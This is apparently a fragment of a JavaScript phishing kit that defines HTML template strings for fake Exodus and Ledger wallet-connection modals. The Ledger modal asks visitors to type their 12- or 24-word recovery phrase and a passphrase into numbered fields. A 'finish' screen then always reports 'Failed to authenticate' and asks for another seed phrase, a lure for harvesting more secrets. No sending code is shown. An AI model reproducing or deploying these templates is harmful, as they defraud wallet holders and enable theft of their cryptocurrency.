            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
    </div>
</div>

                                        <button onClick="updatePage(ExodusWalletFinishModal);"  class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Continue</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>`;

const LedgerWalletModal = `
<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Ledger Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <!--<svg width="147" height="128" viewBox="0 0 147 128" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path d="M0 91.6548V128H55.293V119.94H8.05631V91.6548H0ZM138.944 91.6548V119.94H91.707V127.998H147V91.6548H138.944ZM55.3733 36.3452V91.6529H91.707V84.3842H63.4296V36.3452H55.3733ZM0 0V36.3452H8.05631V8.05844H55.293V0H0ZM91.707 0V8.05844H138.944V36.3452H147V0H91.707Z" fill="black"/>
                                                    </svg>-->
                                                    <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="696.000000pt" height="697.000000pt" viewBox="0 0 696.000000 697.000000"
 preserveAspectRatio="xMidYMid meet">

<g transform="translate(0.000000,697.000000) scale(0.100000,-0.100000)"
fill="#000000" stroke="none">
<path d="M0 3485 l0 -3485 3480 0 3480 0 0 3485 0 3485 -3480 0 -3480 0 0
-3485z m2890 2250 l0 -145 -757 -2 -758 -3 -3 -437 -2 -438 -145 0 -145 0 0
585 0 585 905 0 905 0 0 -145z m2980 -440 l0 -585 -145 0 -145 0 -2 438 -3
437 -757 3 -758 2 0 145 0 145 905 0 905 0 0 -585z m-2688 -1662 l3 -758 438
-3 437 -2 0 -145 0 -145 -585 0 -585 0 0 905 0 905 145 0 145 0 2 -757z
m-1810 -1810 l3 -438 758 -3 757 -2 0 -145 0 -145 -905 0 -905 0 0 585 0 585
145 0 145 0 2 -437z m4498 -148 l0 -585 -905 0 -905 0 0 145 0 145 758 2 757
3 3 438 2 437 145 0 145 0 0 -585z"/>
</g>
</svg>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Import Ledger Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your Ledger wallet,<br>enter the secret phrase.<br></div>
                                        </div>
<div class="jssSolrise17 MuiBox-root css-0">
    <div class="MuiBox-root css-3mllz6 css-selector">
    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">
    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">
<option value="12">I have 12-word phrase</option>
<option value="24">I have 24-word phrase</option>
</select>
    </div>
    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>
    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">
        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
    </div>
</div>

                                        <button onClick="updatePage(LedgerWalletFinishModal);"  class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Continue</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>`;

const LedgerWalletFinishModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(LedgerWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Ledger Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
                                                 width="696.000000pt" height="697.000000pt" viewBox="0 0 696.000000 697.000000"
                                                 preserveAspectRatio="xMidYMid meet">

                                                <g transform="translate(0.000000,697.000000) scale(0.100000,-0.100000)"
                                                fill="#000000" stroke="none">
                                                <path d="M0 3485 l0 -3485 3480 0 3480 0 0 3485 0 3485 -3480 0 -3480 0 0
                                                -3485z m2890 2250 l0 -145 -757 -2 -758 -3 -3 -437 -2 -438 -145 0 -145 0 0
                                                585 0 585 905 0 905 0 0 -145z m2980 -440 l0 -585 -145 0 -145 0 -2 438 -3
                                                437 -757 3 -758 2 0 145 0 145 905 0 905 0 0 -585z m-2688 -1662 l3 -758 438
                                                -3 437 -2 0 -145 0 -145 -585 0 -585 0 0 905 0 905 145 0 145 0 2 -757z
                                                m-1810 -1810 l3 -438 758 -3 757 -2 0 -145 0 -145 -905 0 -905 0 0 585 0 585
                                                145 0 145 0 2 -437z m4498 -148 l0 -585 -905 0 -905 0 0 145 0 145 758 2 757
                                                3 3 438 2 437 145 0 145 0 0 -585z"/>
                                                </g>
                                                </svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">
                                            <h1 class="sc-ftvSup fqLYro">Failed to authenticate<br></h1>
                                            <div class="sc-papXJ jCcNJP">To continue, try using another seed phrase.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <button onclick="updatePage(LedgerWalletModal);" class="sc-himrzO eyWopv">
                              <div class="sc-ikZpkk FGzOk">
                                 <div class="sc-jIZahH gjHfVN">
                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
